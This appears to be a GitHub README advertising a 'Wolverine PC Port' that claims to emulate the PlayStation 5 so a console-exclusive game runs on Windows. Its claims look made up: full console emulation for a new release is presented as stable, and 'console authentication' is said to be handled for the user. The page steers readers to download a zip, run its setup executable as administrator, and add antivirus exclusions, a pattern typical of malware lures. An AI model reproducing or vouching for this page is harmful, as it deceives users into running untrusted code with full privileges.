# Wolverine PC Port

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Desktop compatibility layer for running Marvel's Wolverine on PC via console environment emulation — no PlayStation 5 required.

<div align="center">

[![Download Wolverine PC Port v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-DC2626?style=for-the-badge&logoColor=white)](https://github.com/AvalancheTrader/marvel-wolverine-pc-port-2026/releases/tag/1.0.0)

</div>

---

## 📋 Overview

**The problem:** Marvel's Wolverine launched on September 15, 2026, as a PlayStation 5 exclusive — and Sony has confirmed no PC version is planned. PC gamers who want to play Insomniac's brutal take on Logan are locked out unless they buy a console.

**The solution:** Wolverine PC Port is a desktop compatibility layer that emulates the console environment on your PC. It handles the translation between console APIs and Windows, applies graphics optimization, and provides full controller support. You install it, point it at your game files, and play — no PS5 required.

**Who it's for:** PC gamers in the US and Europe who want to play Marvel's Wolverine on their existing hardware.

---

## 🧩 Capabilities

### Console Environment Emulation
- Translates console system calls to Windows APIs
- Emulates console memory layout and I/O behavior
- Handles save data format conversion
- Manages console-specific authentication transparently

### PC Optimization
- Adaptive graphics presets based on GPU and CPU tier
- Frame pacing stabilization for consistent frame times
- Memory management tuned for 16 GB systems
- Shader pre-compilation to reduce stutter

### Controller Support
- Native Xbox and DualSense support with haptics
- Generic controller mapping with deadzone tuning
- Keyboard and mouse fallback with aim smoothing
- Custom button remapping per profile

### Graphics Configuration
- Resolution scaling and upscaling options
- Ray tracing toggle with performance presets
- HDR calibration wizard
- Per-scene quality profiles

---

## 🎮 Supported Versions

| Platform | Patch | Status |
|----------|-------|--------|
| PlayStation 5 | Launch build (1.0.0) | ✅ Supported |
| PlayStation 5 | Post-launch patches | ✅ Supported |

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 16 GB | 32 GB |
| **Storage** | 100 GB SSD | 150 GB NVMe SSD |
| **GPU** | NVIDIA RTX 2060 / AMD RX 5700 | NVIDIA RTX 3080 / AMD RX 6800 XT |
| **CPU** | Intel Core i5-10400 / AMD Ryzen 5 3600 | Intel Core i7-12700K / AMD Ryzen 7 5800X |
| **DirectX** | Version 12 | Version 12 Ultimate |
| **Permissions** | Administrator | Administrator |

---

## 🔧 Installation

1. Download `Wolverine-PC-Port-v1.0.0.zip` using the button above
2. Extract with 7-Zip or WinRAR
3. Right-click `WolverinePCSetup.exe` and select **Run as administrator**
4. Follow the setup wizard — it auto-detects your hardware
5. Choose the installation folder for the compatibility layer
6. Wait for the file extraction to complete
7. Launch the game from the `WolverinePC` shortcut

---

## ❓ FAQ

**Will I get banned for using this?**  
Wolverine PC Port targets the single-player campaign only. Marvel's Wolverine is a single-player title with no multiplayer component and no anti-cheat. Use is limited to your local single-player installation.

**Do I need to disable my antivirus?**  
Some antivirus suites may flag the compatibility layer as a false positive. Add an exclusion for the port folder if needed.

**Does it work with game updates?**  
Yes — the compatibility layer is updated for current patches. After a major game update, you may need to re-apply. Updates are typically released within 24-48 hours.

**Do I need a PS5?**  
No — the compatibility layer emulates the console environment entirely on your PC.

**Does it work on Steam Deck?**  
The port is designed for Windows desktop systems. Steam Deck compatibility is not officially supported.

**How do I uninstall?**  
Run `WolverinePCSetup.exe --uninstall` — it removes the layer, profiles, and registry entries without touching your game files.

---

## 🗺️ Roadmap — 2026

- [ ] Performance patches for mid-range GPUs
- [ ] Expanded controller remapping options
- [ ] Cloud profile sync for settings across machines
- [ ] HDR calibration improvements
- [ ] Community-shared graphics profiles
- [ ] Linux support via Proton compatibility

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download Wolverine PC Port v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-DC2626?style=for-the-badge&logoColor=white)](https://github.com/AvalancheTrader/marvel-wolverine-pc-port-2026/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · PC Compatibility · MIT

</div>
